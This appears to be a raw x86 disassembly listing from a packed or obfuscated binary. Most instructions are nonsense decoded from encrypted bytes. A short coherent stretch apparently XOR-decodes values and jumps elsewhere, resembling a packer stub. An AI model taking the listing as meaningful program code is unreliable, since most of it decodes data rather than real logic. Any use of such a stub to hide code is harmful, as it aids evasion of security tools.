  413907:	dec    DWORD PTR [eax+0x2fcbe707]
  41390d:	lahf   
  41390e:	pop    edi
  41390f:	xchg   edx,eax
  413910:	push   cs
  413911:	pop    ds
  413912:	or     DWORD PTR [eax],ecx
  413914:	mov    ds:0x6c7248ba,al
  413919:	xchg   esp,eax
  41391a:	stc    
  41391b:	icebp  
  41391c:	call   0x4747:0x126cf32c
  413923:	xchg   edx,eax
  413924:	inc    edx
  413925:	add    DWORD PTR [edi+esi*1+0x44f6cf6],ecx
  41392c:	jl     0x4138e8
  41392e:	cmc    
  41392f:	(bad)  
  413930:	push   0x3fd30f46
  413935:	pusha  
  413936:	fs dec edx
  413938:	ds push ebx
  41393a:	cmp    al,0xc8
  41393c:	out    0xf8,eax
  41393e:	ret    0x4fd3
  413941:	in     eax,0x7a
  413943:	imul   ebp,DWORD PTR [esi],0xf5003b0b
  413949:	lods   al,BYTE PTR ds:[esi]
  41394a:	mov    cs,WORD PTR [eax+0x6d5dafd3]
  413950:	mov    bl,0x27
  413952:	xchg   ecx,eax
  413953:	jae    0x41398a
  413955:	stos   DWORD PTR es:[edi],eax
  413956:	(bad)  
  413957:	int3   
  413958:	pop    esp
  413959:	addr16 jne 0x41393f
  41395c:	sar    DWORD PTR [edx+eiz*8-0x62],1
  413960:	mov    cl,0x26
  413962:	jnp    0x4138f6
  413964:	push   ebx
  413965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413966:	jmp    0x7a4ac67a
  41396b:	mul    edi
  41396d:	inc    edx
  41396e:	repz xchg ebx,ecx
  413971:	mov    eax,esi
  413973:	les    esp,FWORD PTR [ebx]
  413975:	in     eax,0xd2
  413977:	in     eax,dx
  413978:	inc    ebp
  413979:	retf   
  41397a:	loope  0x413977
  41397c:	jl     0x4139e6
  41397e:	dec    edx
  41397f:	call   0x3de07e6
  413984:	add    al,0x2c
  413986:	das    
  413987:	or     al,0x9c
  413989:	jecxz  0x4139df
  41398b:	out    0xc2,al
  41398d:	jg     0x4139e0
  41398f:	mov    edi,0xb6b0b43c
  413994:	aaa    
  413995:	mov    ebx,0x8c3fc10e
  41399a:	retf   0x84ca
  41399d:	outs   dx,DWORD PTR ds:[esi]
  41399e:	stos   DWORD PTR es:[edi],eax
  41399f:	das    
  4139a0:	out    dx,al
  4139a1:	pop    ss
  4139a2:	ret    
  4139a3:	in     al,0xcf
  4139a5:	xchg   ebx,eax
  4139a6:	mov    ah,0x9
  4139a8:	sahf   
  4139a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ab:	mov    al,0x80
  4139ad:	dec    edi
  4139ae:	in     al,dx
  4139af:	in     eax,dx
  4139b0:	inc    edx
  4139b1:	jno    0x413a28
  4139b3:	sti    
  4139b4:	sub    BYTE PTR [edx],ah
  4139b6:	(bad)  
  4139b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b8:	ins    BYTE PTR es:[edi],dx
  4139b9:	or     BYTE PTR [esi+0x2b],dh
  4139bc:	mov    bl,0xc3
  4139be:	mov    DWORD PTR [edi],edx
  4139c0:	cld    
  4139c1:	mov    edi,0x891b57d5
  4139c6:	data16 out 0xf3,al
  4139c9:	mov    bl,0x2a
  4139cb:	and    DWORD PTR [eax],edx
  4139cd:	fadd   QWORD PTR [edi-0x7]
  4139d0:	aam    0x3e
  4139d2:	jmp    0x4139de
  4139d4:	pop    ecx
  4139d5:	jmp    0xf4e7:0x9cd6ea65
  4139dc:	retf   0x604c
  4139df:	sbb    BYTE PTR [edi-0x6],0x49
  4139e3:	xchg   esp,eax
  4139e4:	mov    edi,0x71e44a62
  4139e9:	js     0x413a44
  4139eb:	fiadd  WORD PTR [ecx+0x179635a4]
  4139f1:	retf   0x1601
  4139f4:	pop    esp
  4139f5:	xor    BYTE PTR [ebx],dl
  4139f7:	pop    ecx
  4139f8:	ins    DWORD PTR es:[edi],dx
  4139f9:	push   0x3fd762f4
  4139fe:	xor    esi,DWORD PTR [edx+0x14]
  413a01:	mov    edx,0x7ca8e3c7
  413a06:	(bad)  
  413a07:	in     al,dx
  413a08:	lea    ecx,[edx+ebp*2-0x17]
  413a0c:	(bad)  
  413a0d:	(bad)  
  413a0f:	jecxz  0x4139a9
  413a11:	inc    esp
  413a12:	shl    al,cl
  413a14:	enter  0x4857,0x52
  413a18:	sub    eax,0x65ade1f
  413a1d:	dec    ebx
  413a1e:	enter  0x7671,0xc6
  413a22:	and    ah,BYTE PTR [ebp+0x7bf2e2c3]
  413a28:	test   DWORD PTR [ebx+0x5f],0x83b2b234
  413a2f:	inc    edx
  413a30:	daa    
  413a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a32:	fld    DWORD PTR [edi+0x1ea7ffa9]
  413a38:	lods   al,BYTE PTR ds:[esi]
  413a39:	lea    ecx,[esi]
  413a3b:	mov    eax,ds:0x658e6e87
  413a40:	mov    DWORD PTR [ebp+0x19],ecx
  413a43:	add    DWORD PTR [eax],edi
  413a45:	sbb    BYTE PTR [eax],ch
  413a47:	pop    edx
  413a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a49:	mov    edi,ecx
  413a4b:	test   al,0xa4
  413a4d:	repnz sub dl,0x19
  413a51:	fadd   QWORD PTR [ebx+0x48]
  413a54:	xchg   ecx,eax
  413a55:	inc    esp
  413a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a57:	in     eax,0x73
  413a59:	adc    eax,0x6da024ab
  413a5e:	or     bl,cl
  413a60:	cmc    
  413a61:	push   ds
  413a62:	leave  
  413a63:	mov    BYTE PTR [edi+edi*8],bh
  413a66:	sub    ecx,DWORD PTR [esi]
  413a68:	sbb    al,0x2b
  413a6a:	mov    bh,0xe8
  413a6c:	push   ss
  413a6d:	jb     0x413a64
  413a6f:	pop    ss
  413a70:	push   es
  413a71:	cmp    al,0x1d
  413a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a74:	leave  
  413a75:	add    DWORD PTR [ebx+0x5],eax
  413a78:	sub    cl,BYTE PTR [esi+0x24]
  413a7b:	push   edx
  413a7c:	fsub   QWORD PTR [eax+0x384e6c59]
  413a82:	ins    DWORD PTR es:[edi],dx
  413a83:	mov    ds,WORD PTR [ebp+eax*2+0x2e]
  413a87:	lock sti 
  413a89:	vaddps ymm0,ymm5,YMMWORD PTR [eax+0x6c]
  413a8e:	sub    al,0x75
  413a90:	and    ecx,DWORD PTR [eax-0xba708c2]
  413a96:	jbe    0x413a2b
  413a98:	inc    esi
  413a99:	outs   dx,DWORD PTR ds:[esi]
  413a9a:	inc    edx
  413a9b:	les    ebx,FWORD PTR [esi+edx*8]
  413a9e:	mul    DWORD PTR [edi]
  413aa0:	daa    
  413aa1:	fsubr  QWORD PTR [edx]
  413aa3:	mov    edi,esi
  413aa5:	or     DWORD PTR [ecx+0x6b891f62],edx
  413aab:	repz ret 
  413aad:	(bad)  
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	add    eax,0x244f7fc4
  413ab4:	xchg   ecx,eax
  413ab5:	enter  0xd103,0xd8
  413ab9:	icebp  
  413aba:	jg     0x413a6d
  413abc:	add    al,BYTE PTR [esi]
  413abe:	pushf  
  413abf:	jmp    0x4229bca3
  413ac4:	and    BYTE PTR [ebx-0x73e2c4f1],al
  413aca:	test   al,0x33
  413acc:	pop    edi
  413acd:	shr    dh,cl
  413acf:	jp     0x413aa0
  413ad1:	rol    BYTE PTR [eax-0x3eead74b],1
  413ad7:	jbe    0x413a69
  413ad9:	lds    eax,FWORD PTR [ecx+ecx*4+0x26]
  413add:	dec    ebx
  413ade:	jp     0x413b5b
  413ae0:	jge    0x413a80
  413ae2:	fwait
  413ae3:	dec    edi
  413ae4:	pop    edx
  413ae5:	ja     0x413b18
  413ae7:	ja     0x413b11
  413ae9:	in     al,0x33
  413aeb:	inc    esi
  413aec:	loop   0x413a7e
  413aee:	gs jg  0x413ac2
  413af1:	push   ebx
  413af2:	mov    dh,0x9e
  413af4:	imul   edi,DWORD PTR [eax+0x1e],0xc60b0815
  413afb:	(bad)  
  413afc:	rcl    BYTE PTR [ecx],1
  413afe:	bound  edi,QWORD PTR [edi+0x2b]
  413b01:	xor    al,0x3a
  413b03:	in     al,dx
  413b04:	shld   DWORD PTR [ebx],esi,0x43
  413b08:	xor    ebx,DWORD PTR [esi-0x66]
  413b0b:	fimul  DWORD PTR [esi-0x18]
  413b0e:	adc    DWORD PTR [edx+0x33],edx
  413b11:	daa    
  413b12:	adc    ebp,ebp
  413b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b15:	pop    ebx
  413b16:	hlt    
  413b17:	ja     0x413b8b
  413b19:	dec    eax
  413b1a:	mov    DWORD PTR [ebp-0x6],ebp
  413b1d:	mov    ds:0xa043a271,eax
  413b22:	nop
  413b23:	xchg   DWORD PTR [eax],edx
  413b25:	lds    ebp,FWORD PTR [esi+0x738919b2]
  413b2b:	xor    ebp,ebp
  413b2d:	and    eax,0x444485db
  413b32:	xor    bh,BYTE PTR [esi+0x37]
  413b35:	repnz lahf 
  413b37:	fs xchg ecx,eax
  413b39:	xchg   BYTE PTR [edx-0x73],cl
  413b3c:	imul   edi,DWORD PTR [edi],0x5d6a08d7
  413b42:	mov    esi,0xde34d12b
  413b47:	test   DWORD PTR [ecx],eax
  413b49:	neg    DWORD PTR [esi-0x32fe831e]
  413b4f:	out    dx,al
  413b50:	fmul   DWORD PTR ds:0x62cf9a50
  413b56:	int3   
  413b57:	ins    BYTE PTR es:[edi],dx
  413b58:	pop    edx
  413b59:	ja     0x413aed
  413b5b:	out    0xe7,eax
  413b5d:	sub    eax,0xf1e1dadd
  413b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b64:	div    DWORD PTR [ebp-0x1e]
  413b67:	loopne 0x413bdc
  413b69:	mov    ds:0x411d05c6,al
  413b6e:	fs clc 
  413b70:	adc    al,0xfd
  413b72:	pop    edx
  413b73:	sahf   
  413b74:	out    dx,al
  413b75:	or     eax,0x8907939c
  413b7a:	repz jecxz 0x413bcd
  413b7d:	or     al,0x50
  413b7f:	mov    ebx,0xe94df92
  413b84:	(bad)  
  413b85:	cmp    eax,0x741f5865
  413b8a:	js     0x413b72
  413b8c:	fwait
  413b8d:	addr16 addr16 dec esi
  413b90:	les    ebp,FWORD PTR [edx]
  413b92:	div    edi
  413b94:	sbb    DWORD PTR [ebx],esp
  413b96:	fisttp QWORD PTR [edx-0x1b]
  413b99:	dec    ecx
  413b9a:	sbb    edi,DWORD PTR [ebp-0x7e5229bf]
  413ba0:	dec    ecx
  413ba1:	dec    edx
  413ba2:	sbb    al,0xbb
  413ba4:	das    
  413ba5:	sbb    DWORD PTR [ecx-0x200e5538],ebx
  413bab:	(bad)
  413baf:	mov    edi,0x7d26e877
  413bb4:	mov    ecx,0x775e295d
  413bb9:	loop   0x413bfc
  413bbb:	in     al,0xe4
  413bbd:	rep ins BYTE PTR es:[edi],dx
  413bbf:	dec    ebp
  413bc0:	adc    ch,BYTE PTR [ebx]
  413bc2:	cmp    DWORD PTR [edx],ebp
  413bc4:	add    ebx,DWORD PTR [edi+0x40]
  413bc7:	push   0x90257620
  413bcc:	bound  eax,QWORD PTR [eax]
  413bce:	imul   eax,ebp,0x5
  413bd1:	mov    edi,0x93304063
  413bd6:	jbe    0x413b5a
  413bd8:	push   ebp
  413bd9:	pop    ebx
  413bda:	mov    ds:0x4ef4d98c,al
  413bdf:	pop    es
  413be0:	jmp    0xd103:0xe6994031
  413be7:	mov    ecx,0xba5c5716
  413bec:	retf   0x1b23
  413bef:	inc    ebp
  413bf0:	fwait
  413bf1:	aaa    
  413bf2:	add    BYTE PTR [esi+0x1d90ba8d],0xd
  413bf9:	mul    DWORD PTR [edx-0x4fa10c14]
  413bff:	inc    esi
  413c00:	mov    ecx,0x7758fd3
  413c05:	xor    al,0xe9
  413c07:	mov    ah,0x1a
  413c09:	or     al,0x2e
  413c0b:	push   ecx
  413c0c:	adc    al,0xe4
  413c0e:	cmp    bl,cl
  413c10:	loope  0x413c4b
  413c12:	mov    BYTE PTR [eax+0x37360991],bl
  413c18:	cs xchg esi,eax
  413c1a:	retf   0xf17b
  413c1d:	jmp    0x7d573905
  413c22:	(bad)  
  413c23:	push   cs
  413c24:	push   edi
  413c25:	or     esi,eax
  413c27:	sub    ebp,DWORD PTR [edx-0x68]
  413c2a:	adc    bh,BYTE PTR [eax]
  413c2c:	pop    ecx
  413c2d:	cwde   
  413c2e:	rcr    DWORD PTR [ebp-0x35],0x13
  413c32:	push   cs
  413c33:	sub    al,al
  413c35:	jo     0x413c92
  413c37:	mov    ecx,0xde8afa1b
  413c3c:	(bad)  
  413c3e:	test   al,0x8a
  413c40:	lds    ebp,FWORD PTR [esp+edx*1]
  413c43:	and    BYTE PTR [ebx],dh
  413c45:	xor    BYTE PTR [ecx+0xc],0x7
  413c49:	shl    DWORD PTR [edi],1
  413c4b:	mov    al,0x1e
  413c4d:	hlt    
  413c4e:	(bad)  
  413c4f:	xor    DWORD PTR ss:[esi-0x37e14988],eax
  413c56:	and    al,0x46
  413c58:	in     eax,dx
  413c59:	mov    ebp,0xfff8c38b
  413c5e:	or     BYTE PTR [ebx-0x10],bl
  413c61:	jbe    0x413c9a
  413c63:	xor    eax,0x3adc6ad4
  413c68:	pusha  
  413c69:	or     DWORD PTR [ebx+0x10ba753b],0xea00b517
  413c73:	sub    BYTE PTR [esi-0x77bc5985],dh
  413c79:	ret    0x356a
  413c7c:	push   edx
  413c7d:	pop    esi
  413c7e:	push   esp
  413c7f:	jmp    0x413c98
  413c81:	inc    ebx
  413c82:	lahf   
  413c83:	cmp    DWORD PTR [esi+ebx*1+0x41],ebx
  413c87:	ja     0x413ce5
  413c89:	dec    esi
  413c8a:	jnp    0x413c4f
  413c8c:	stc    
  413c8d:	fild   WORD PTR [ebp+0x67f2a435]
  413c93:	ja     0x413c41
  413c95:	cwde   
  413c96:	in     eax,dx
  413c97:	call   0xfb201f35
  413c9c:	lahf   
  413c9d:	dec    edx
  413c9e:	cmpxchg BYTE PTR [edi-0x40],ch
  413ca2:	push   ebp
  413ca3:	and    BYTE PTR [edx+0x46],bl
  413ca6:	mov    ch,0x89
  413ca8:	cmc    
  413ca9:	sbb    DWORD PTR ds:0xdc480c3a,edx
  413caf:	in     al,0x7d
  413cb1:	inc    ecx
  413cb2:	push   esi
  413cb3:	out    dx,al
  413cb4:	jg     0x413c8a
  413cb6:	and    eax,0x5b519d24
  413cbb:	mov    esp,DWORD PTR [edi-0x4a767a8d]
  413cc1:	mov    bh,BYTE PTR [ebx+0x3fc792f9]
  413cc7:	push   0xd2199c28
  413ccc:	jmp    0xf62c:0x19e2bd56
  413cd3:	jge    0x413d54
  413cd5:	and    DWORD PTR [eax-0x7f3e17fd],edx
  413cdb:	jl     0x413d26
  413cdd:	dec    ecx
  413cde:	cli    
  413cdf:	sar    BYTE PTR [edx-0x279b293a],cl
  413ce5:	pop    edx
  413ce6:	nop
  413ce7:	or     bl,BYTE PTR [edx]
  413ce9:	mul    DWORD PTR [ebp-0x60d74a4b]
  413cef:	les    esp,FWORD PTR [ebp+0x71151401]
  413cf5:	cmp    ch,0x4c
  413cf8:	mov    ebx,0xc6eb82d7
  413cfd:	inc    ebp
  413cfe:	mov    ah,0x5a
  413d00:	clc    
  413d01:	or     al,0xf8
  413d03:	fs imul edx,edi,0x23
  413d07:	or     al,0x32
  413d09:	fadd   st,st(6)
  413d0b:	mov    edi,0x47926b11
  413d10:	add    dh,al
  413d12:	(bad)  
  413d13:	or     eax,DWORD PTR ds:0xe95a46c2
  413d19:	xor    ah,BYTE PTR [esi-0x471ddb73]
  413d1f:	sub    al,0xd3
  413d21:	and    eax,0xbed034c4
  413d26:	(bad)  
  413d27:	std    
  413d28:	jns    0x413d36
  413d2a:	sub    edi,DWORD PTR [eax+0xe]
  413d2d:	(bad)  
  413d2e:	ins    DWORD PTR es:[edi],dx
  413d2f:	jp     0x413cb5
  413d31:	cld    
  413d32:	idiv   BYTE PTR [esi]
  413d34:	out    0x5d,al
  413d36:	and    BYTE PTR [edi+0x16],al
  413d39:	or     BYTE PTR [ebp-0x33],dh
  413d3c:	retf   0xa778
  413d3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d40:	adc    al,0x5b
  413d42:	push   esp
  413d43:	adc    BYTE PTR [esi],ch
  413d45:	xchg   esi,eax
  413d46:	sar    BYTE PTR [esp+ebx*4+0x4a2292c1],0xba
  413d4e:	outs   dx,DWORD PTR ds:[esi]
  413d4f:	retf   0x666e
  413d52:	sbb    esp,ebp
  413d54:	dec    edx
  413d55:	push   eax
  413d56:	ror    DWORD PTR [edi-0x309d0c1e],0xca
  413d5d:	mov    eax,0x5e3d24dc
  413d62:	dec    edi
  413d63:	(bad)  
  413d64:	push   esp
  413d65:	in     eax,dx
  413d66:	dec    esp
  413d67:	inc    edx
  413d68:	mov    al,ds:0xf10d8772
  413d6d:	loop   0x413dab
  413d6f:	int3   
  413d70:	cdq    
  413d71:	sbb    al,BYTE PTR [ebx-0x33]
  413d74:	mov    ch,0xb3
  413d76:	test   esi,0x35e73e70
  413d7c:	inc    cx
  413d7e:	sub    ebx,ecx
  413d80:	xchg   ebx,ecx
  413d82:	dec    ecx
  413d83:	dec    ecx
  413d84:	mov    eax,DWORD PTR [ebp-0x1c]
  413d87:	imul   eax,ecx
  413d8a:	add    esp,eax
  413d8c:	xchg   edx,eax
  413d8d:	push   eax
  413d8e:	xor    ebx,ebx
  413d90:	mov    edx,esp
  413d92:	dec    edx
  413d93:	inc    ebx
  413d94:	add    ebx,DWORD PTR [edx+ebx*1]
  413d97:	dec    ebx
  413d98:	xor    edx,edx
  413d9a:	add    DWORD PTR [ebp-0x10],ebx
  413d9d:	pop    ebx
  413d9e:	mov    eax,DWORD PTR [ebp-0x10]
  413da1:	pop    edi
  413da2:	pop    esi
  413da3:	pop    ebx
  413da4:	leave  
  413da5:	ret    0x10
  413da8:	push   ebp
  413da9:	mov    ebp,esp
  413dab:	push   ecx
  413dac:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413db3:	sub    DWORD PTR ds:0x42a2e6,ebx
  413db9:	mov    eax,DWORD PTR [ebp-0x4]
  413dbc:	and    DWORD PTR ds:0x42a2e6,0x0
  413dc6:	jmp    0x413dd8
  413dcb:	mov    edx,DWORD PTR ds:0x42a2e6
  413dd1:	inc    edx
  413dd2:	mov    DWORD PTR ds:0x42a2e6,edx
  413dd8:	cmp    DWORD PTR ds:0x42a2e6,0x1a
  413ddf:	jae    0x413e0a
  413de5:	cmp    DWORD PTR ds:0x42a2e6,0x2a
  413dec:	ja     0x413e0a
  413df2:	jmp    0x413e05
  413df7:	push   DWORD PTR [ebp-0x10]
  413dfa:	push   0x42a27e
  413dff:	call   DWORD PTR ds:0x42a3ce
  413e05:	jmp    0x413dcb
  413e0a:	mov    edx,DWORD PTR [ebp+0x10]
  413e0d:	mov    ecx,0x75108aa
  413e12:	xor    eax,ecx
  413e14:	sbb    DWORD PTR ds:0x42a2aa,0x2976
  413e1e:	add    eax,0x3272f1
  413e23:	xor    DWORD PTR ds:0x42a272,0x42a2b6
  413e2d:	mov    DWORD PTR [edx],eax
  413e2f:	mov    eax,DWORD PTR [ebp+0xc]
  413e32:	and    edx,DWORD PTR ds:0x42a2f2
  413e38:	xor    eax,ecx
  413e3a:	and    DWORD PTR ds:0x42a2de,edi
  413e40:	push   esi
  413e41:	mov    esi,DWORD PTR [ebp+0x10]
  413e44:	mov    edx,0x3272f1
  413e49:	add    eax,edx
  413e4b:	mov    DWORD PTR [esi+0x4],eax
  413e4e:	mov    eax,DWORD PTR [ebp+0x14]
  413e51:	mov    esi,DWORD PTR [ebp+0x10]
  413e54:	mov    DWORD PTR [esi+0x8],eax
  413e57:	mov    eax,DWORD PTR [ebp+0x18]
  413e5a:	mov    esi,DWORD PTR [ebp+0x10]
  413e5d:	mov    DWORD PTR [esi+0xc],eax
  413e60:	mov    eax,DWORD PTR [ebp+0x1c]
  413e63:	mov    esi,DWORD PTR [ebp+0x10]
  413e66:	mov    DWORD PTR [esi+0x10],eax
  413e69:	mov    eax,DWORD PTR [ebp+0x8]
  413e6c:	xor    eax,ecx
  413e6e:	add    eax,edx
  413e70:	jmp    0x416225
  413e75:	mov    esi,ebx
  413e77:	push   ebx
  413e78:	push   esi
  413e79:	or     edx,esi
  413e7b:	xchg   BYTE PTR [esi+0x72f8d7bb],ch
  413e81:	inc    ebx
  413e82:	fisttp WORD PTR [edx]
  413e84:	jp     0x413e1a
  413e86:	gs jl  0x413e0c
  413e89:	jmp    0x413ee9
  413e8b:	add    DWORD PTR [ebx-0x1494c3b2],0x48
  413e92:	fwait
  413e93:	jl     0x413eef
  413e95:	out    0x83,al
  413e97:	sbb    BYTE PTR [ebp-0x70],cl
  413e9a:	jmp    0x9619:0x769641ce
  413ea1:	daa    
  413ea2:	sub    al,0x69
  413ea4:	or     eax,0x38335781
  413ea9:	push   ebp
  413eaa:	dec    edi
  413eab:	jge    0x413ef2
  413ead:	and    eax,0x7b2ebb92
  413eb2:	lock int3 
  413eb4:	lahf   
  413eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb6:	cld    
  413eb7:	shl    DWORD PTR [ebx],0x72
  413eba:	(bad)  [ebp+0x3737846f]
  413ec0:	add    BYTE PTR [edi+0x66],ch
  413ec3:	jg     0x413e81
  413ec5:	mov    ebp,0xcf39478a
  413eca:	cmp    DWORD PTR [edi],0xffffffcd
  413ecd:	sbb    cl,0x15
  413ed0:	mov    bl,0x39
  413ed2:	mov    esi,0x31a8b35c
  413ed7:	mov    ebp,0x4f90a2e1
  413edc:	jmp    0xae1f9d05
  413ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee2:	retf   
  413ee3:	or     cl,dh
  413ee5:	inc    edx
  413ee6:	repz scas eax,DWORD PTR es:[edi]
  413ee8:	test   DWORD PTR ds:0xae262130,0xbd44edc7
  413ef2:	push   eax
  413ef3:	mov    ds:0xdbf00d5a,eax
  413ef8:	lods   al,BYTE PTR ds:[esi]
  413ef9:	add    eax,0xc6f75131
  413efe:	std    
  413eff:	lock das 
  413f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f02:	loope  0x413ed5
  413f04:	mov    bl,0x5b
  413f06:	sbb    eax,0x45a10948
  413f0b:	push   ebx
  413f0c:	adc    al,0xd4
  413f0e:	bt     DWORD PTR [esi-0x74485c4d],eax
  413f15:	cmp    edi,DWORD PTR [esi+0x4d]
  413f18:	jbe    0x413f7d
  413f1a:	(bad)  
  413f1b:	sbb    edi,DWORD PTR ds:0xeb521534
  413f21:	and    al,0xc6
  413f23:	pushf  
  413f24:	inc    esp
  413f25:	dec    esp
  413f26:	adc    DWORD PTR [esi],0x15
  413f29:	(bad)  
  413f2a:	fimul  WORD PTR [esi+0x2e]
  413f2d:	repz fild WORD PTR [ebp-0x49d1b6ac]
  413f34:	hlt    
  413f35:	bound  edi,QWORD PTR [edx]
  413f37:	mov    bl,0x87
  413f39:	push   ds
  413f3a:	adc    DWORD PTR [eax],ebx
  413f3c:	in     eax,0xe
  413f3e:	dec    edi
  413f3f:	sub    DWORD PTR [edx],0xd893b51f
  413f45:	sub    eax,0x49b09817
  413f4a:	in     eax,dx
  413f4b:	jbe    0x413ede
  413f4d:	push   es
  413f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f4f:	cmp    eax,0x430836dc
  413f54:	or     ebx,DWORD PTR [eax+edx*8]
  413f57:	scas   al,BYTE PTR es:[edi]
  413f58:	push   ds
  413f59:	or     ebp,ecx
  413f5b:	xor    al,0x34
  413f5d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5f:	fist   DWORD PTR [edi-0x64219607]
  413f65:	iret   
  413f66:	mov    esp,0xd1cc7ca3
  413f6b:	fist   DWORD PTR [ebp+0x8a2bbe1]
  413f71:	mov    bh,0xbc
  413f73:	out    dx,eax
  413f74:	test   BYTE PTR [edx],dh
  413f76:	mov    ah,0xd
  413f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f79:	adc    DWORD PTR [esi-0x3b1074a],ecx
  413f7f:	and    cl,bl
  413f81:	cmp    BYTE PTR [ebx+0x17947372],bl
  413f87:	popf   
  413f88:	mov    al,0xe1
  413f8a:	jno    0x413fd5
  413f8c:	cli    
  413f8d:	outs   dx,DWORD PTR ds:[esi]
  413f8e:	in     al,0xde
  413f90:	sub    BYTE PTR [ecx-0x61],dh
  413f93:	mov    BYTE PTR ds:0xda1e0f44,ch
  413f99:	in     al,0x3
  413f9b:	adc    BYTE PTR [ebp+0x7b006183],bh
  413fa1:	dec    edx
  413fa2:	jmp    0x413f2c
  413fa4:	jecxz  0x413fd9
  413fa6:	ret    0xa306
  413fa9:	mov    ds:0xb879818b,eax
  413fae:	loope  0x413f35
  413fb0:	cwde   
  413fb1:	xlat   BYTE PTR ds:[ebx]
  413fb2:	inc    eax
  413fb3:	jbe    0x41402d
  413fb5:	mov    eax,ds:0x3770a87b
  413fba:	sbb    eax,0x34821318
  413fbf:	pop    ecx
  413fc0:	jb     0x413fca
  413fc2:	dec    ecx
  413fc3:	push   ebx
  413fc4:	xchg   BYTE PTR [ecx+0x56bae1cf],dh
  413fca:	push   ds
  413fcb:	(bad)  
  413fcc:	(bad)  
  413fcd:	dec    BYTE PTR [edx]
  413fcf:	(bad)  
  413fd0:	pop    edi
  413fd1:	and    al,0x12
  413fd3:	sar    DWORD PTR [ebx],0x7b
  413fd6:	and    BYTE PTR [ebx],0xef
  413fd9:	leave  
  413fda:	stc    
  413fdb:	sub    al,0xa4
  413fdd:	xor    eax,0xb17a6765
  413fe2:	fstp   TBYTE PTR [edx]
  413fe4:	dec    edx
  413fe5:	cmp    ebp,ebp
  413fe7:	cmp    al,0xbf
  413fe9:	mov    dh,0x2c
  413feb:	hlt    
  413fec:	xor    esi,DWORD PTR ds:0x29ff09dd
  413ff2:	mov    dl,0x78
  413ff4:	cld    
  413ff5:	ins    DWORD PTR es:[edi],dx
  413ff6:	scas   al,BYTE PTR es:[edi]
  413ff7:	mov    cl,0x58
  413ff9:	addr16 inc esp
  413ffb:	cld    
  413ffc:	jmp    0x5a0b:0x2a143e80
  414003:	fwait
  414004:	cmp    eax,0x42c2c8e1
  414009:	and    al,0xb0
  41400b:	push   ecx
  41400c:	repnz enter 0xe43a,0x4e
  414011:	jnp    0x413fde
  414013:	or     BYTE PTR [ecx-0x27],al
  414016:	or     BYTE PTR [edi-0x41],ah
  414019:	pop    ecx
  41401a:	cwde   
  41401b:	jmp    0xca8d:0x32305fbb
  414022:	fld    QWORD PTR [eiz*1+0xfc13f04]
  414029:	xlat   BYTE PTR ds:[ebx]
  41402a:	lahf   
  41402b:	int    0x89
  41402d:	jl     0x414051
  41402f:	adc    eax,0x45f0b069
  414034:	xlat   BYTE PTR ds:[ebx]
  414035:	or     al,0x61
  414037:	mov    edi,0x45243f7a
  41403c:	cdq    
  41403d:	scas   eax,DWORD PTR es:[edi]
  41403e:	pop    ds
  41403f:	or     BYTE PTR [ecx],dh
  414041:	mov    DWORD PTR [ebp-0x38bb21b2],ebp
  414047:	(bad)  
  414048:	(bad)
  41404b:	dec    ecx
  41404c:	nop
  41404d:	jecxz  0x41404a
  41404f:	leave  
  414050:	enter  0xd94c,0x3
  414054:	pop    esi
  414055:	mov    esi,0x2e2021fe
  41405a:	jns    0x414028
  41405c:	(bad)  
  41405d:	pushf  
  41405e:	push   eax
  41405f:	add    eax,0x6e779473
  414064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414065:	dec    edx
  414066:	fistp  DWORD PTR [ebp-0x31]
  414069:	retf   
  41406a:	sbb    bl,BYTE PTR [ebp-0x80]
  41406d:	neg    esp
  41406f:	xchg   edx,eax
  414070:	jo     0x414082
  414072:	not    BYTE PTR [eax+eax*2+0x2c]
  414076:	pop    esp
  414077:	push   edx
  414078:	jmp    0x414006
  41407a:	pop    esp
  41407b:	retf   0x1cbf
  41407e:	fmul   DWORD PTR ds:0x66372782
  414084:	scas   al,BYTE PTR es:[edi]
  414085:	xor    al,0xd
  414087:	(bad)  
  414088:	loop   0x414029
  41408a:	sti    
  41408b:	inc    esi
  41408c:	xchg   ecx,eax
  41408d:	and    ebx,esi
  41408f:	loop   0x4140a3
  414091:	fnsave [ebx]
  414093:	push   ecx
  414094:	cmp    BYTE PTR [eax+0x5834a22c],bh
  41409a:	mov    bh,BYTE PTR [edi]
  41409c:	imul   ebx,ebx,0x12
  41409f:	test   eax,0xdf3bb2a0
  4140a4:	adc    al,0x12
  4140a6:	and    al,0xdd
  4140a8:	cld    
  4140a9:	adc    al,0x94
  4140ab:	cli    
  4140ac:	pop    ebp
  4140ad:	rol    BYTE PTR ds:0x6db86749,cl
  4140b3:	mov    ebp,esp
  4140b5:	in     al,0xe9
  4140b7:	in     eax,0x57
  4140b9:	pop    ecx
  4140ba:	mov    ecx,0x67e8b1ab
  4140bf:	imul   edi,ebx,0x4d
  4140c2:	sub    eax,DWORD PTR cs:[esi+0x1ec38edd]
  4140c9:	fmulp  st(4),st
  4140cb:	inc    edx
  4140cc:	pop    edi
  4140cd:	pusha  
  4140ce:	xchg   ecx,eax
  4140cf:	add    BYTE PTR [edi+0x55],bl
  4140d2:	nop
  4140d3:	mov    dl,0x45
  4140d5:	xchg   edi,eax
  4140d6:	mov    bl,0x80
  4140d8:	cli    
